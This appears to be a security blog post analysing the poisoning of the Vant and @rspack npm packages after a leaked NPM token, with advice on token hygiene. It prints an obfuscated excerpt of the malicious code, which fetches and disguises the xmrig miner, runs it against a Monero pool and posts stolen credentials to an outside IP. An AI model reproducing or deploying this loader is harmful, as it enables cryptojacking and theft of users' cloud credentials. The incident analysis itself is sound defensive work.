---
title: A poisoning incident caused by an NPM token leak
top: true
---
## Background

Due to the leak of a developer's NPM token, the NPM packages Vant, @rspack/core, and @rspack/cli were poisoned.
[![Issues](/assets/2024-12-19/token-leak-github.jpg)](https://github.com/youzan/vant/discussions/13273)
The attacker embedded the mining software xmrig in the code and stole users' cloud service credentials.
The poisoned partial code:
```javascript
function _0x490324() {
        return _0x4a8553(this, undefined, undefined, function* () {
            const _0x3f26b7 = yield function (_0x1d5cc6) {
                return _0x4a8553(this, undefined, undefined, function* () {
                    const _0x2c5ca1 = "https://api.github.com/repos/youzan/vant/git/blobs/" + _0x1d5cc6;
                    const _0x474a42 = _0x16ed2a.join("/tmp/", "vant.tar.gz");
                    const _0x1e3d06 = _0x16ed2a.join("/tmp/", "vant");
                    const _0x3fe94f = {
                        'Accept': 'application/vnd.github.raw+json'
                    };
                    try {
                        0x0;
                        const _0x37fd84 = yield _0x33f3f1["default"]({
                            'method': "GET",
                            'url': _0x2c5ca1,
                            'responseType': "stream",
                            'headers': _0x3fe94f
                        });
                    try {
                        yield _0x4973ce.x({
                            'file': _0x474a42,
                            'cwd': "/tmp/"
                        });
                    return _0x1e3d06;
                });
            }("8ed1c9256b4bfeb3e4f5aaff48bf140398361ae3");
            if ('' === _0x3f26b7) {
                            const _0x13db7a = yield _0x33f3f1["default"]({
                                'method': "GET",
                                'url': 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz',
                                'responseType': "stream"
                            });
                        try {
                            yield _0x4973ce.x({
                                'file': _0x29d56d,
                                'cwd': "/tmp/",
                                'filter': _0xae122a => _0xae122a.endsWith("xmrig"),
                                'strip': 0x1
                            });
                            yield _0x14f1da.renameSync("/tmp/xmrig", '/tmp/vant_helper');
                    });
                }(), ['-u', "475NBZygwEajj4YP2Bdu7yg6XnaphiFjxTFPkvzg5xAjLGPSakE68nyGavn8r1BYqB44xTEyKQhueeqAyGy8RaYc73URL1j", '-o', "pool.supportxmr.com:443", '--tls', '-k', '--cpu-max-threads-hint=75', "--background"]);
            yield function (_0x392e85) {
                    try {
                        (yield _0x33f3f1["default"].post("http://80.78.28.72/tokens", _0x57e4cd)).status;
                    }
        });
}
```
## What is an NPM Token used for?

> 1. Authenticating and accessing the NPM registry:
An NPM token is used to authenticate a developer's identity and securely access the NPM registry. It allows developers to publish and install packages without needing to use a username and password.
> 2. Automating package publishing:
NPM tokens enable developers to automate tasks like publishing packages to the NPM registry. This eliminates the need to manually enter credentials each time, streamlining the workflow.
> 3. Managing permissions for private packages:
NPM tokens can be used to manage and control access to private packages, ensuring that only authorized users or systems can install or modify them.
> 4. Storing tokens securely:
NPM tokens are typically stored in configuration files or environment variables. This ensures sensitive information, such as API keys or credentials, is securely managed and not exposed in plain text.

## How to generate it?
We can create an NPM token by clicking on the avatar -> Access Tokens in the official NPM repository.
![NPM Token](/assets/2024-12-19/npm-tokens.jpg)

## Why does it get leaked?
Aside from system hacks or phishing attacks, a common cause of leaks is hardcoding the NPM Token and accidentally publishing it to a public code repository.

## If it gets leaked, it can be exploited for poisoning?
If two-factor authentication is not enabled, an NPM Token leak could directly grant attackers access to sensitive information or resources, as well as the ability to publish new versions of malicious components.

## Suggestions
1. Enable Multi-Factor Authentication (MFA)
2. Regularly Replace Tokens
3. Store Tokens in a Secure Location
4. Monitor Logs for Suspicious Activity